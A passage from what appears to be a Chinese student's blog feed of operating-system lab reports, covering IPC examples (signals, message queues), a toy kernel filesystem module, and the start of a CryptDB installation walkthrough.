sleep."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parent_code</span><span class="params">(<span class="keyword">pid_t</span> cpid)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Parent sleeping for a time..."</span>);</span><br><span class="line">  sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to terminate child. */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="number">-1</span> == kill(cpid, SIGTERM)) &#123;</span><br><span class="line">    perror(<span class="string">"kill"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  wait(<span class="literal">NULL</span>); <span class="comment">/** wait for child to terminate **/</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"My child terminated, about to exit myself..."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"main..."</span>);</span><br><span class="line">  <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"main...2"</span>);</span><br><span class="line">  <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">"fork"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">/* error */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"main...3"</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == pid)&#123; </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"child_code..."</span>);</span><br><span class="line">    child_code();</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"parent_code..."</span>);</span><br><span class="line">    parent_code(pid);</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">/* normal */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="队列通信-sender-receiver"><a href="#队列通信-sender-receiver" class="headerlink" title="队列通信 ./sender ./receiver"></a>队列通信 <code>./sender ./receiver</code></h2><ol><li><p>消息队列是一系列的消息，每个消息包括两个部分：荷载，一个字节序列；类型，以一个正整数值得形式给定，类型用来分类消息，为了更灵活的回收。</p></li><li><p>下面展示的 4 个消息中，标记为 1 的是开头，即最接近接收端，接着连续标记为 2 的消息，最后接着一个标记为 3 的消息。假如按照严格的<code>FIFO</code>行为执行，消息将会以<code>1-2-2-3</code>这样的次序被接收。但是消息队列允许其他收取次序。例如，消息可以被接收方以<code>3-2-1-2</code>的次序接收。说明消息队列足够的灵活。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125112906.png" alt=""></p></li><li><p><code>sender.c</code>：通过<code>megsnd</code>函数程序发送<code>sender</code>程序将发送出 6 个消息，每两个为一个类型：前两个是类型 1，接着的连个是类型 2，最后的两个为类型 3。且被配置为非阻塞的<code>IPC_NOWAIT</code>标志。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"queue.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">report_and_exit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>); <span class="comment">/* EXIT_FAILURE */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">key_t</span> key = ftok(PathName, ProjectId); </span><br><span class="line">  <span class="keyword">if</span> (key &lt; <span class="number">0</span>) report_and_exit(<span class="string">"couldn't get key..."</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> qid = msgget(key, <span class="number">0666</span> | IPC_CREAT); </span><br><span class="line">  <span class="keyword">if</span> (qid &lt; <span class="number">0</span>) report_and_exit(<span class="string">"couldn't get queue id..."</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* payloads[] = &#123;<span class="string">"msg1"</span>, <span class="string">"msg2"</span>, <span class="string">"msg3"</span>, <span class="string">"msg4"</span>, <span class="string">"msg5"</span>, <span class="string">"msg6"</span>&#125;;</span><br><span class="line">  <span class="keyword">int</span> types[] = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>&#125;; <span class="comment">/* each must be &gt; 0 */</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MsgCount; i++) &#123;</span><br><span class="line">    <span class="comment">/* build the message */</span></span><br><span class="line">    queuedMessage msg;</span><br><span class="line">    msg.type = types[i];</span><br><span class="line">    <span class="built_in">strcpy</span>(msg.payload, payloads[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* send the message */</span></span><br><span class="line">    msgsnd(qid, &amp;msg, <span class="keyword">sizeof</span>(msg), IPC_NOWAIT); <span class="comment">/* don't block */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s sent as type %i\n"</span>, msg.payload, (<span class="keyword">int</span>) msg.type);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>receiver.c</code>程序分析：对<code>msgget</code>的调用可能因为带有<code>IPC_CREAT</code>标志而具有误导性，但是这个标志的真实意义是如果需要就创建，否则直接获取。<code>sender</code>程序调用<code>msgsnd</code>来发送消息，而<code>receiver</code>调用<code>msgrcv</code>来接收它们。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"queue.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">report_and_exit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>); <span class="comment">/* EXIT_FAILURE */</span></span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">  <span class="keyword">key_t</span> key= ftok(PathName, ProjectId); <span class="comment">/* key to identify the queue */</span></span><br><span class="line">  <span class="keyword">if</span> (key &lt; <span class="number">0</span>) report_and_exit(<span class="string">"key not gotten..."</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> qid = msgget(key, <span class="number">0666</span> | IPC_CREAT); <span class="comment">/* access if created already */</span></span><br><span class="line">  <span class="keyword">if</span> (qid &lt; <span class="number">0</span>) report_and_exit(<span class="string">"no access to queue..."</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> types[] = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>&#125;; <span class="comment">/* different than in sender */</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MsgCount; i++) &#123;</span><br><span class="line">    queuedMessage msg; <span class="comment">/* defined in queue.h */</span></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(qid, &amp;msg, <span class="keyword">sizeof</span>(msg), types[i], MSG_NOERROR | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"msgrcv trouble..."</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s received as type %i\n"</span>, msg.payload, (<span class="keyword">int</span>) msg.type);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** remove the queue **/</span></span><br><span class="line">  <span class="keyword">if</span> (msgctl(qid, IPC_RMID, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)  <span class="comment">/* NULL = 'no flags' */</span></span><br><span class="line">    report_and_exit(<span class="string">"trouble removing queue..."</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="实验数据与结果"><a href="#实验数据与结果" class="headerlink" title="实验数据与结果"></a>实验数据与结果</h1><h2 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h2><ol><li><p>使用<code>make</code>命令编译程序；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125114909.png" alt=""></p></li><li><p>执行<code>./producer</code>，程序向<code>data.dat</code>写入数据；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125115118.png" alt=""><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125115349.png" alt=""></p></li><li><p>在终端输入<code>./consumer</code>，显示data.dat中的内容</p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191125115447185.png" alt="image-20191125115447185"></p></li></ol><h2 id="内存共享"><a href="#内存共享" class="headerlink" title="内存共享"></a>内存共享</h2><ol><li><p>向内存中写入信息</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125122459.png" alt=""></p></li><li><p>从内存中读取信息</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125122557.png" alt=""></p></li></ol><h2 id="管道通信"><a href="#管道通信" class="headerlink" title="管道通信"></a>管道通信</h2><ol><li><p>开启两个终端(两个终端工作目录相同)在其中一个终端输入以下命令：即先创建一个备份文件，名为2017213618，然后将管道的内容输出到stdout中。最开始并没有什么会出现在终端中，因为还没有向管道中写入任何数据。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125120847.png" alt=""></p></li><li><p>在第二个终端输入以下命令无论在这个终端中输入什么，它都会在第一个终端中显示出来；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125121030.png" alt=""></p></li><li><p>一旦键入<code>Ctrl+C</code>，就会回到正常的命令行提示符，因为管道已经被关闭了。最后通过移除实现命名管道的文件来进行清理。</p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191125121214465.png" alt="image-20191125121214465"></p></li><li><p>不同的终端中启动<code>fifoWriter</code> 和<code>fifoReader</code>，但二者处于相同的工作目录。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125121419.png" alt=""></p></li></ol><h2 id="信号量互斥"><a href="#信号量互斥" class="headerlink" title="信号量互斥"></a>信号量互斥</h2><ol><li><p>在终端输入<code>./shutdown</code>，得到如下输出，成功的模拟了信号的这种轻量的<code>IPC</code>方法。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125121535.png" alt=""></p></li></ol><h2 id="队列通信"><a href="#队列通信" class="headerlink" title="队列通信"></a>队列通信</h2><ol><li><p>输出显示<code>sender</code>和<code>receiver</code>可以在同一个终端中启动。输出也显示消息队列是持久的，在这个例子中，<code>sender</code>以<code>1-1-2-2-3-3</code>的次序发送消息，但<code>receiver</code>接收它们的次序为<code>3-1-2-1-3-2</code>，表明消息队列没有被严格的<code>FIFO</code>行为所拘束。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125121812.png" alt=""> </p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 操作系统内核实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IPC机制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统内核 实验四</title>
      <link href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E5%9B%9B.html"/>
      <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E5%9B%9B.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>掌握文件系统的工作机理</li><li>理解文件系统的主要数据结构</li><li>学习较为复杂的Linux下的编程</li><li>了解EXT2文件系统的结构</li></ol><a id="more"></a><h1 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h1><h2 id="外存管理"><a href="#外存管理" class="headerlink" title="外存管理"></a>外存管理</h2><p>文件系统层次结构如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191028140351.png" alt=""></p><h2 id="目录管理"><a href="#目录管理" class="headerlink" title="目录管理"></a>目录管理</h2><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191028140429.png" alt=""></p><h2 id="文件系统接口"><a href="#文件系统接口" class="headerlink" title="文件系统接口"></a>文件系统接口</h2><p>命令接口</p><p>程序接口</p><h2 id="Linux的EXT2文件系统"><a href="#Linux的EXT2文件系统" class="headerlink" title="Linux的EXT2文件系统"></a>Linux的EXT2文件系统</h2><ul><li><p>EXT2文件系统结构<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191028140906.png" alt=""></p></li><li><p>数据地址安排</p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111002748.png" style="zoom:10%;" /></li></ul><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><p>输入命令<code>make</code>编译该文件系统：成功<code>build modules</code>(该实验是在root用户下实现的，不需要输入<code>sudo</code>)<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111021201.png" alt=""></p></li><li><p>输入命令<code>insmod aufs.ko</code>安装模块<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111021442.png" alt=""></p></li><li><p>使用<code>dmesg</code>命令查看模块是否安装成功<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111021630.png" alt=""></p><p>在使用<code>dmesg</code>命令后，输出了相当多的模块信息</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111021717.png" alt=""></p><p>在输出信息的最后，可以发现语句如下，表示模块已经安装成功.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ 1861.402049] create inode cache success</span><br><span class="line">[ 1861.402056] register filesystem success</span><br><span class="line">[ 1861.402059] aufs module loaded</span><br></pre></td></tr></table></figure></li><li><p>输入命令<code>mount -o loop -t aufs ./image ./dir</code>挂载设备<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111022338.png" alt=""></p></li><li><p>使用命令<code>dmesg</code>再次打印模块输出，可以查看挂载是否成功.</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111022446.png" alt=""></p><p>获得了<code>super block</code>的相关信息<code>super block</code>结构是指文件系统在磁盘分区的特殊位置中存储的文件系统参数集，包括：</p><ol><li><code>magic</code></li><li>索引节点块——<code>inode blocks</code></li><li>块大小——<code>block size</code></li><li>根节点——<code>root inode</code></li><li>块中的索引节点数——<code>inodes in block</code></li></ol></li><li><p>卸载模块前必须先卸载已挂载的文件系统，否则会出现以下错误 ：<br><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191111022536623.png" alt="image-20191111022536623"></p></li><li><p>输入<code>mount</code>指令查看已挂载的设备，找到挂载的文件系统及其挂载点为<code>/root/桌面/filesystem/image</code>和<code>/root/桌面/filesystem/dir</code><br><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191111022608021.png" alt="image-20191111022608021"></p></li><li><p>卸载系统后，卸载模块。在卸载已挂载的设备时，该设备不能有进程在运行。<br><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191111022828188.png" alt="image-20191111022828188"></p></li><li><p>再输入<code>dmesg</code>命令显示已卸载。<br><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191111022905569.png" alt="image-20191111022905569"></p></li></ol><h1 id="核心代码分析"><a href="#核心代码分析" class="headerlink" title="核心代码分析"></a>核心代码分析</h1><p>本次实验代码的核心在<code>inode</code>分配函数</p><h2 id="aufs-fill-sb函数"><a href="#aufs-fill-sb函数" class="headerlink" title="aufs_fill_sb函数"></a><code>aufs_fill_sb</code>函数</h2><p>在为根目录创建<code>dentry</code>（目录项）之前，应创建根目录的索引节点（索引节点）。索引节点结构可能是文件系统中最重要的一种。每个文件系统对象（文件，文件夹，特殊文件，杂志等）都用<code>inode</code>标识。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">aufs_fill_sb</span><span class="params">(struct super_block *sb, <span class="keyword">void</span> *data, <span class="keyword">int</span> silent)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">root</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">      sb-&gt;s_magic = AUFS_MAGIC_NUMBER;</span><br><span class="line">      sb-&gt;s_op = &amp;aufs_super_ops;</span><br><span class="line"></span><br><span class="line">      root = new_inode(sb);</span><br><span class="line">      <span class="keyword">if</span> (!root)</span><br><span class="line">      &#123;</span><br><span class="line">           pr_err(<span class="string">"inode allocation failed\n"</span>);</span><br><span class="line">           <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      root-&gt;i_ino = <span class="number">0</span>;</span><br><span class="line">      root-&gt;i_sb = sb;</span><br><span class="line">      root-&gt;i_atime = root-&gt;i_mtime = root-&gt;i_ctime = CURRENT_TIME;</span><br><span class="line">      inode_init_owner(root, <span class="literal">NULL</span>, S_IFDIR);</span><br><span class="line"></span><br><span class="line">      sb-&gt;s_root = d_make_root(root);</span><br><span class="line">      <span class="keyword">if</span> (!sb-&gt;s_root)</span><br><span class="line">      &#123;</span><br><span class="line">          pr_err(<span class="string">"root creation failed\n"</span>);</span><br><span class="line">          <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="aufs-inode-fill函数"><a href="#aufs-inode-fill函数" class="headerlink" title="aufs_inode_fill函数"></a><code>aufs_inode_fill</code>函数</h2><p>负责填充</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">aufs_inode_fill</span><span class="params">(struct aufs_inode *ai,</span></span></span><br><span class="line"><span class="function"><span class="params">            struct aufs_disk_inode <span class="keyword">const</span> *di)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ai-&gt;ai_block = be32_to_cpu(di-&gt;di_first);</span><br><span class="line">    ai-&gt;ai_inode.i_mode = be32_to_cpu(di-&gt;di_mode);</span><br><span class="line">    ai-&gt;ai_inode.i_size = be32_to_cpu(di-&gt;di_size);</span><br><span class="line">    ai-&gt;ai_inode.i_blocks = be32_to_cpu(di-&gt;di_blocks);</span><br><span class="line">    ai-&gt;ai_inode.i_ctime.tv_sec = be64_to_cpu(di-&gt;di_ctime);</span><br><span class="line">    ai-&gt;ai_inode.i_mtime.tv_sec = ai-&gt;ai_inode.i_atime.tv_sec =</span><br><span class="line">                ai-&gt;ai_inode.i_ctime.tv_sec;</span><br><span class="line">    ai-&gt;ai_inode.i_mtime.tv_nsec = ai-&gt;ai_inode.i_atime.tv_nsec =</span><br><span class="line">                ai-&gt;ai_inode.i_ctime.tv_nsec = <span class="number">0</span>;</span><br><span class="line">    i_uid_write(&amp;ai-&gt;ai_inode, (<span class="keyword">uid_t</span>)be32_to_cpu(di-&gt;di_uid));</span><br><span class="line">    i_gid_write(&amp;ai-&gt;ai_inode, (<span class="keyword">gid_t</span>)be32_to_cpu(di-&gt;di_gid));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 操作系统内核实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件系统管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CryptDB安装与使用实验</title>
      <link href="/CryptDB%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8%E5%AE%9E%E9%AA%8C.html"/>
      <url>/CryptDB%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8%E5%AE%9E%E9%AA%8C.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>通过对CryptDB的安装和使用，了解学习加密数据库查询技术的原理和实现方式.</p><a id="more"></a><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><ul><li>操作系统：ubuntu 12.04</li><li>工具：CryptDB、git、ruby</li></ul><h1 id="CryptDB简介"><a href="#CryptDB简介" class="headerlink" title="CryptDB简介"></a>CryptDB简介</h1><ul><li><p>CryptDB 是来自MIT的一个开源项目，它不是某种数据库，而是加密数据库查询技术的一种，可以在加密的数据库（目前支持MySQL）上进行简单的操作。正常说来， 一个应用是直接连接数据库的，配置了CryptDB后，CryptDB作为应用和数据库的中间代理，以明文的方式与应用交互，以密文的方式与数据库交互。</p></li><li><p>CryptDB首次解决了实用性的问题，它将数据嵌套进多个加密层，每层使用不同的密钥，这些加密密钥与用户的密码有关，即便是数据库管理员也不能访问这些加密的数据，这也防止了因数据库泄露导致用户信息泄露的问题。虽然目前支持的SQL语句有限，还没有到真正投入使用的程度，但其性却非常出众。Google也根据CryptDB的设计开发了Encrypted BigQuery client。 </p></li><li><p>CryptDB官网的介绍如下</p><blockquote><p>Online applications are vulnerable to theft of sensitive information  because adversaries can exploit software bugs to gain access to private  data, and because curious or malicious administrators may capture and  leak data. CryptDB is a system that provides practical and provable  confidentiality in the face of these attacks for applications backed by  SQL databases. It works by executing SQL queries over encrypted data  using a collection of efficient SQL-aware encryption schemes. CryptDB  can also chain encryption keys to user passwords, so that a data item  can be decrypted only by using the password of one of the users with  access to that data. As a result, a database administrator never gets  access to decrypted data, and even if all servers are compromised, an  adversary cannot decrypt the data of any user who is not logged in. An  analysis of a trace of 126 million SQL queries from a production MySQL  server shows that CryptDB can support operations over encrypted data for 99.5% of the 128,840 columns seen in the trace. Our evaluation shows  that CryptDB has low overhead, reducing throughput by 14.5% for phpBB, a web forum application, and by 26% for queries from TPC-C, compared to  unmodified MySQL. Chaining encryption keys to user passwords requires  11-13 unique schema annotations to secure more than 20 sensitive fields  and 2-7 lines of source code changes for three multi-user web  applications. </p></blockquote></li></ul><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="CryptDB安装"><a href="#CryptDB安装" class="headerlink" title="CryptDB安装"></a>CryptDB安装</h2><ol><li><p>安装Ubuntu系统</p><p>CryptDB依附于ubuntu系统，本次实验使用的是12.04版本的系统，已经安装完毕；</p></li><li><p>安装git和ruby</p><p>安装git是为了获取官网的源码；</p><p>安装ruby是因为CryptDB的安装脚本使用ruby语言编写；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git ruby</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212011701.png" alt=""></p></li><li><p>克隆CryptDB代码</p><p>把CryptDB项目克隆到了主目录下，后续步骤中也会安装到这个目录；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> -b public git://g.csail.mit.edu/cryptdb</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212012233.png" alt=""></p></li><li><p>安装CryptDB</p><p>进入到cryptdb文件夹，执行安装脚本，按照提示，等待完成。</p><p>在此过程中会要求设置mysql密码，因后续过程需要mysql和CryptDB密码相同，所以在此设置了mysql密码为CryptDB默认密码letmein；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> cryptdb</span><br><span class="line">$ ./scripts/install.rb .</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212012327.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191212014946.png" alt=""></p></li><li><p>添加环境变量<code>EDBDIR</code>到<code>.bashrc</code></p><p>编辑<code>cryptdb/</code><strong>同</strong>目录下的<code>.bashrc</code>，把下面的代码添加到最后；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export EDBDIR=/home/levi/cryptdb/</span><br></pre></td></tr></table></figure><p>至此，安装完成，重启设备即可使用CryptDB；</p></li></ol><h2 id="CryptDB使用"><a href="#CryptDB使用" class="headerlink" 